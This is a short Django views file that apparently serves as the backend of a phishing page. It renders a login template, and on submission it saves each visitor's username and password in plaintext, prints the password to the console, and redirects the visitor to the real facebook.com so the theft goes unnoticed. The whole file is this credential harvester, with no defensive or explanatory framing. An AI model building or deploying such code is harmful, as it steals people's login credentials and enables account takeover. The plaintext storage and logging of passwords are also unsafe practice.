from .models import Accounts
from django.shortcuts import render,redirect

# Create your views here.
def mainView(request):
    if request.method == "GET":
        return render(request, 'home.html')
    elif request.method == "POST":
        account = Accounts()
        account.username = request.POST.get('username')
        account.passwd = request.POST.get('password')
        print(request.POST.get('password'))
        account.save()
        return redirect("https://facebook.com/")
        #user = Accounts.objects.create(username=request.POST["username"],
        #     passwd=request.POST["password"])
        #user.save()

